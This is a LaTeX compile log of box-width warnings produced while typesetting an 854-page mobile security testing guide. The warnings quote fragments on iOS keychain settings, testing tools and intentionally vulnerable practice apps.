\TU/SourceSansPro(0)/m/n/10.95 (if you want to secure the data and properly enf
orce a passcode or Touch ID requirement),

Overfull \hbox (178.7255pt too wide) in paragraph at lines 47662--47670
\TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
\TU/SourceSansPro(0)/m/n/10.95 , or \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAcce
ssibleWhenUnlockedThisDeviceOnly\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (160.1616pt too wide) in paragraph at lines 47674--47685
\TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
 \TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAcce
ssibleWhenUnlockedThisDeviceOnly\TU/SourceSansPro(0)/m/n/10.95 ),

Overfull \hbox (22.60417pt too wide) in paragraph at lines 47674--47685
\TU/SourceSansPro(0)/m/n/10.95 and the \TU/SourceCodePro(6)/m/n/10.95 SecAccess
ControlCreateFlags \TU/SourceSansPro(0)/m/n/10.95 is set either with \TU/Source
CodePro(6)/m/n/10.95 kSecAccessControlDevicePasscode

Overfull \hbox (120.33586pt too wide) in paragraph at lines 47674--47685
\TU/SourceSansPro(0)/m/n/10.95 (for passcodes), \TU/SourceCodePro(6)/m/n/10.95 
kSecAccessControlUserPresence \TU/SourceSansPro(0)/m/n/10.95 (passcode, Face ID
 or Touch ID), \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryAny

Underfull \hbox (badness 10000) in paragraph at lines 47692--47696
\TU/SourceSansPro(0)/m/n/10.95 - [][]$[][][][][] [] [] [] [][][][][][] [] [][][
] [] [][][][][][][][][][] [] [][][][][][] [][] [][][][][][] [][] [][][][][][][]
[] [][] [][][][][][] [] [][][][] [] [][][][][][] [] [][][][][][][][][] [][] [][
][][] [][]
[836] [837] [838]
Underfull \hbox (badness 1137) in paragraph at lines 47848--47853
[]\TU/SourceSansPro(0)/m/n/10.95 Frida: A dynamic instrumentation toolkit for d
evelopers, reverse-engineers, and security re-
[839]
Underfull \hbox (badness 3568) in paragraph at lines 47934--47938
[]\TU/SourceSansPro(0)/m/n/10.95 ClassNameDeobfuscator: Simple script to parse 
through the .smali files produced by ap-

Underfull \hbox (badness 10000) in paragraph at lines 47934--47938
\TU/SourceSansPro(0)/m/n/10.95 ktool and extract the .source annotation lines -
 [][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][][][][][][][][
][][] []
[840]
Overfull \hbox (11.56958pt too wide) in paragraph at lines 47976--47979
[]\TU/SourceSansPro(0)/m/n/10.95 Android Tcpdump: A command line packet capture
 utility for Android - [][]$[][][][][] [] [] [] [][][] [] [][][][][][][][][][][
][][][] []
[841]
Underfull \hbox (badness 5726) in paragraph at lines 48047--48049
[]\TU/SourceSansPro(0)/m/n/10.95 itunnel: A tool used to forward SSH via USB - 
[][]$[][][][][] [] [] [] [][][][] [] [][][][][][] [] [][][] [] [] [] [][][][][]
[][][][][][][] [][]
[842]
Underfull \hbox (badness 4060) in paragraph at lines 48170--48173
[]\TU/SourceSansPro(0)/m/n/10.95 tsProtector: A tool for bypassing Jailbreak de
tection - [][]$[][][][] [] [] [] [][][][][] [] [][][][][][] [] [][][] [] [][][]
[][][][] [] [][] []

Underfull \hbox (badness 10000) in paragraph at lines 48173--48175
[]\TU/SourceSansPro(0)/m/n/10.95 Xcon: A tool for bypassing Jailbreak detection
 - [][]$[][][][] [] [] [] [][][][][] [] [][][][][][] [] [][][] [] [][][][][][][
] [] [][][] []
[843]
Underfull \hbox (badness 2521) in paragraph at lines 48214--48217
[]\TU/SourceSansPro(0)/m/n/10.95 Burp Suite: An integrated platform for perform
ing security testing of applications - [][]$[][][][][] []

Underfull \hbox (badness 2913) in paragraph at lines 48217--48221
[]\TU/SourceSansPro(0)/m/n/10.95 Charles Proxy: HTTP proxy / HTTP monitor / Rev
erse Proxy that enables a developer to

Underfull \hbox (badness 3601) in paragraph at lines 48217--48221
\TU/SourceSansPro(0)/m/n/10.95 view all of the HTTP and SSL / HTTPS traffic bet
ween their machine and the Internet -
[844]
Underfull \hbox (badness 3209) in paragraph at lines 48272--48278
[]\TU/SourceSansPro(0)/m/n/10.95 AndroGoat: An open source vulnerable/insecure 
app using Kotlin. This app has a wide

Underfull \hbox (badness 4205) in paragraph at lines 48272--48278
\TU/SourceSansPro(0)/m/n/10.95 range of vulnerabilities related to certificate 
pinning, custom URL schemes, Android Net-

Underfull \hbox (badness 3323) in paragraph at lines 48272--48278
\TU/SourceSansPro(0)/m/n/10.95 work Security Configuration, WebViews, root dete
ction and over 20 other vulnerabilities -

Underfull \hbox (badness 1062) in paragraph at lines 48278--48281
[]\TU/SourceSansPro(0)/m/n/10.95 DVHMA: A hybrid mobile app (for Android) that 
intentionally contains vulnerabilities - [][]$[][][][][] []

Underfull \hbox (badness 1112) in paragraph at lines 48298--48302
[]\TU/SourceSansPro(0)/m/n/10.95 MSTG Android app: Java - A vulnerable Android 
app with vulnerabilities similar to the test

Underfull \hbox (badness 5274) in paragraph at lines 48320--48325
[]\TU/SourceSansPro(0)/m/n/10.95 DVIA: A vulnerable iOS app written in Objectiv
e-C which provides a platform to mobile

Underfull \hbox (badness 4132) in paragraph at lines 48320--48325
\TU/SourceSansPro(0)/m/n/10.95 security enthusiasts/professionals or students t
o test their iOS penetration testing skills -
[845]
Underfull \hbox (badness 2990) in paragraph at lines 48384--48389
[]\TU/SourceSansPro(0)/m/n/10.95 Charlie Miller, Dionysus Blazakis, Dino Dai Zo
vi, Stefan Esser, Vincenzo Iozzo, Ralf-Philipp

Underfull \hbox (badness 1917) in paragraph at lines 48384--48389
\TU/SourceSansPro(0)/m/n/10.95 Weinmann (2012) \TU/SourceSansPro(0)/m/it/10.95 
iOS Hacker’s Handbook\TU/SourceSansPro(0)/m/n/10.95 . Wiley. Available at: [][]
$[][][][][] [] [] [] [][][] [] [][][][][] [] [][][] [] [][] [][]
[846]
Underfull \hbox (badness 1642) in paragraph at lines 48406--48410
[]\TU/SourceSansPro(0)/m/n/10.95 Bruce Dang, Alexandre Gazet, Elias Backaalany 
(2014) \TU/SourceSansPro(0)/m/it/10.95 Practical Reverse Engineering\TU/SourceS
ansPro(0)/m/n/10.95 . Wiley.

Underfull \hbox (badness 1226) in paragraph at lines 48406--48410
\TU/SourceSansPro(0)/m/n/10.95 Available at: [][]$[][][][][] [] [] [] [][][] []
 [][][][][] [] [][][] [] [][] [][] [][] [] [][][][][][][][][] [] [][][][][][][]
 [] [][][][][][][][][][][] [] [][] [] [][][] [] [][] [] [][][] []

Underfull \hbox (badness 2376) in paragraph at lines 48413--48417
\TU/SourceSansPro(0)/m/n/10.95 GSEC Singapore. Available at: [][]$[][][][] [] [
] [] [][][][] [] [][][][] [] [][][] [] [][][][][][][][][] [] [][][][][][] [] []
[] [] [][] [][] [][][][][][][][][][][] []
[847]
Underfull \hbox (badness 10000) in paragraph at lines 48441--48444
[][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][] [] [][][][][] [][
] [][][][] [] [][][][][] [] [] [] [][] [] [][][][] [] [][] [] [][][][][][][][] 
[] [][][][][][] [] [][][][][][] [][] [][] [][] [][] [] [][][][][] [][]
[848] [849]
Underfull \hbox (badness 2012) in paragraph at lines 48580--48586
\TU/SourceSansPro(0)/m/n/10.95 Dump(Z/etc), Clutch, Drozer, Frida, Hopper, Ghid
ra, IDB, Ipa Installer, iFunBox, iOS-deploy,
[850] [851] [852] [853] [854] (/tmp/tex2pdf.-b81d3c9506d190f0/input.aux) )
(see the transcript file for additional information)
Output written on /tmp/tex2pdf.-b81d3c9506d190f0/input.pdf (854 pages).
Transcript written on /tmp/tex2pdf.-b81d3c9506d190f0/input.log.

Cleaning up
